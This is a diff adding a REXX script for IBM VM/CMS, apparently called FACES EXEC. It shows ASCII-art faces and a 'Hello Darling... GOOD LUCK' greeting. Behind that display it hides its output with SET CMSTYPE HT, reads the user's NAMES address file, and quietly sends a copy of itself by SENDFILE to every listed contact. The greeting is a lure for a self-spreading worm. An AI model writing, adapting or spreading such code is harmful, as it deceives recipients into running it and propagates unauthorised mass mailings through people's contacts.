@@ -1,0 +1,59 @@
+/* faces !!!! */
+'VMFCLEAR'
+'ID (STACK'
+parse pull . . locnod
+say;say;say
+hi='1dc8'x;lo='1dc1'x
+say' 'hi'----------------------------'lo' '
+say'                                      '
+say'  P U T  A  H A T  on your H E A D    '
+say'                                      '
+say'    /"""""\        (#########)        '
+say'   |       |      (#########)         '
+say'   |  (o)(o)       (o)(o)(##)         '
+say'   C   .---_)    ,_C     (##)         '
+say'    | |.___|    /____,   (##)         '
+say'    |  \__/       \     (#)           '
+say'    /_____\        |    |             '
+say'   /_____/ \       OOOOOO             '
+say'  /         \     /      \            '
+say' 'hi'----------------------------'lo' '
+say;say;say
+say'Hello Darling!  ... 'hi'!'lo'!'hi'!'lo'!'hi'!'lo'
+'hi'H'lo'E'hi'L'lo'L'hi'O'lo' 'hi' 'lo' 'hi' 'lo
+say'   and... 'hi'H'lo'O'hi'W'lo' 'hi'A'lo'R'hi'E'lo' 'hi'U'lo'!'
+say' 'hi'G'lo'O'hi'O'lo'D'hi' 'lo'L'hi'U'lo'C'hi'K'lo
+say' 'lo'G'hi'O'lo'O'hi'D'lo' 'hi'L'lo'U'hi'C'lo'K'hi
+say' 'hi'G'lo'O'hi'O'lo'D'hi' 'lo'L'hi'U'lo'C'hi'K'lo
+say' 'lo'G'hi'O'lo'O'hi'D'lo' 'hi'L'lo'U'hi'C'lo'K'hi
+say' 'hi'G'lo'O'hi'O'lo'D'hi' 'lo'L'hi'U'lo'C'hi'K'lo
+say' 'lo'G'hi'O'lo'O'hi'D'lo' 'hi'L'lo'U'hi'C'lo'K'hi
+say' 'hi'G'lo'O'hi'O'lo'D'hi' 'lo'L'hi'U'lo'C'hi'K'lo
+say' 'lo'G'hi'O'lo'O'hi'D'lo' 'hi'L'lo'U'hi'C'lo'K'hi'BYE'lo'(-.-)'hi
+say
+'SET CMSTYPE HT'
+'STATE 'userid()' NAMES *'
+if rc=0 then do
+'EXECIO * DISKR 'userid()' NAMES *'
+names.0=queued()
+ do i=1 to queued()
+  pull names.i
+ end
+ do i=1 to names.0
+  if index(names.i,':NICK.')=1 then do
+   nick=names.i
+   parse var nick ':NICK.'nick .
+   'NAMEFIND :NICK 'nick' :USERID :NODE (STACK'
+   if rc^=0 then iterate
+   pull userid
+   pull node
+   if strip(userid)=''then iterate
+   if strip(node)='' then node=locnod
+   if index(node,'.')^=0 then iterate
+   address CMS 'SENDFILE FACES EXEC 'USERID' AT 'NODE' (NOLOG NOTYPE'
+  end
+ end
+end
+/* 'SET CMSTYPE RT' */
+/* 'ERASE FACES EXEC' */
+
